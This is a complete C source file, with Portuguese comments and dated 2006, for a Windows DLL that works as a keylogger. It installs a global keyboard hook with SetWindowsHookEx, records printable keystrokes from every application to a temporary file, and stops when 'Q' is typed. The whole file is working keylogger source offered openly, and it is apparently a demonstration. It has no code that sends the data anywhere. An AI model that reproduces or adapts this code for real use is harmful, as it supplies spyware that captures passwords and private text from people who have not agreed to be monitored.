/** @file DLL helper para programa que captura digitação do usuário.

@author Wanderley Caloni
@date dec.2006
*/
#define _CRT_SECURE_NO_DEPRECATE
#define _WIN32_WINNT 0x0400

#include "ocskeyl2.h"
#include <logdebug.h>
#include <sharedvar.h>
#include <windows.h>
#include <stdio.h>

#define OCSKEYL2_DLLNAME "OcsKeyL2.dll"
#define OCSKEYL2_VARNAME "OcsKeyL2SharedVar"
#define OCSKEYL2_WRITELOCK "OcsKeyL2WriteLock"
#define OCSKEYL2_EXITEVT "OcsKeyL2ExitEvent"
#define LOG(args) LogDebug args


struct OcsKeyL2SharedVar
{
	HHOOK hook;
	CHAR logPath[MAX_PATH];
	CHAR lastKey;
	DWORD keyCount;
};


void WriteLogFile(PCSTR filePath, PCSTR format, ...)
{
	HANDLE lock = OpenMutex(MUTEX_ALL_ACCESS, FALSE, OCSKEYL2_WRITELOCK);

	if( lock )
	{
		DWORD waitLock = WaitForSingleObject(lock, 100);

		if( waitLock == WAIT_OBJECT_0 || waitLock == WAIT_ABANDONED_0 )
		{
			HANDLE logFile = CreateFile(filePath, GENERIC_WRITE, FILE_SHARE_READ, 
				NULL, OPEN_EXISTING, 0, NULL);

			if( logFile != INVALID_HANDLE_VALUE )
			{
				va_list vaList;
				CHAR msg[0x1000] = { };

				va_start(vaList, format);
				int printCount = vsprintf(msg, format, vaList);
				va_end(vaList);

				DWORD msgSize = (DWORD) strlen(msg);
				DWORD written = 0;
				
				SetFilePointer(logFile, 0, NULL, FILE_END);
				WriteFile(logFile, msg, msgSize, &written, NULL);

				CloseHandle(logFile);
			}
			
			ReleaseMutex(lock);
		}
		
		CloseHandle(lock);
	}
}


DWORD CreateLogFileName(OcsKeyL2SharedVar* sharedVar)
{
	DWORD ret = ERROR_SUCCESS;
	CHAR tempPath[MAX_PATH];

	if( GetTempPath(sizeof(tempPath), tempPath) )
	{
		if( ! GetTempFileName(tempPath, "ocs", 0, sharedVar->logPath) )
			ret = GetLastError();
	}
	else
		ret = GetLastError();

	return ret;
}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	LRESULT ret = 0;

	OcsKeyL2SharedVar* sharedVar;
	HANDLE sharedVarH = OpenSharedVariable(&sharedVar, OCSKEYL2_VARNAME);

	if( sharedVarH && sharedVar )
	{
		if( nCode == HC_ACTION )
		{
			if( !( lParam & 0x80000000 ) && // tecla está sendo pressionada
				!( lParam & 0x1000000 ) )  // e não é uma tecla extendida
			{
				CHAR key = CHAR(wParam);

				if( isprint(key) )
					WriteLogFile(sharedVar->logPath, "%c", key);
				else switch( key )
				{
					case '\b':
						WriteLogFile(sharedVar->logPath, "<-");
						break;

					case '\r':
						WriteLogFile(sharedVar->logPath, "\r\n");
						break;

					case '\t':
						WriteLogFile(sharedVar->logPath, "\t");
						break;
				}

				if( key == 'Q' )
				{
					HANDLE exitEvt = OpenEvent(EVENT_ALL_ACCESS, FALSE, OCSKEYL2_EXITEVT);

					if( exitEvt )
					{
						SetEvent(exitEvt);
						CloseHandle(exitEvt);
					}
				}
			}
		}

		ret = CallNextHookEx(sharedVar->hook, nCode, wParam, lParam);
		FreeSharedVariable(sharedVarH, sharedVar);
	}

	return ret;
}


DWORD WINAPI InstallHook()
{
	DWORD ret = ERROR_SUCCESS;
	OcsKeyL2SharedVar* sharedVar = 0;
	HANDLE sharedVarH = AllocSharedVariable(&sharedVar, OCSKEYL2_VARNAME);

	if( sharedVarH && sharedVar )
	{
		if( sharedVar->logPath[0] == 0 )
		{
			HANDLE lock = CreateMutex(NULL, FALSE, OCSKEYL2_WRITELOCK);
			HANDLE exitEvt = CreateEvent(NULL, TRUE, FALSE, OCSKEYL2_EXITEVT);

			if( lock && exitEvt )
			{
				ret = CreateLogFileName(sharedVar);

				if( ret == ERROR_SUCCESS )
				{
					SYSTEMTIME sysTime = { };
					GetLocalTime(&sysTime);
					WriteLogFile(sharedVar->logPath,
						"-- %02d.%02d.%04d %02d.%02d.%02d --\r\n", 
						int(sysTime.wDay), int(sysTime.wMonth), int(sysTime.wYear),
						int(sysTime.wHour), int(sysTime.wMinute), int(sysTime.wSecond));

					sharedVar->hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc,
						(HINSTANCE) GetModuleHandle(OCSKEYL2_DLLNAME), 0);

					if( ! sharedVar->hook )
						ret = GetLastError();
					else
					{
						for( ; ; )
						{
							DWORD wait = WaitForSingleObject(exitEvt, 1000);
							
							if( wait == WAIT_OBJECT_0 )
								break;
						}
						
						UnhookWindowsHookEx(sharedVar->hook);
					}
				}
			}

			if( lock )
				CloseHandle(lock);
			if( exitEvt )
				CloseHandle(exitEvt);
		}
		else
			LOG(("OcsKeyL2: shared var already exists."));

		FreeSharedVariable(sharedVarH, sharedVar);
	}
	else
	{
		ret = GetLastError();
		LOG(("OcsKeyL2: error %d trying to allocate shared var.", ret));
	}

	return ret;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	return TRUE;
}
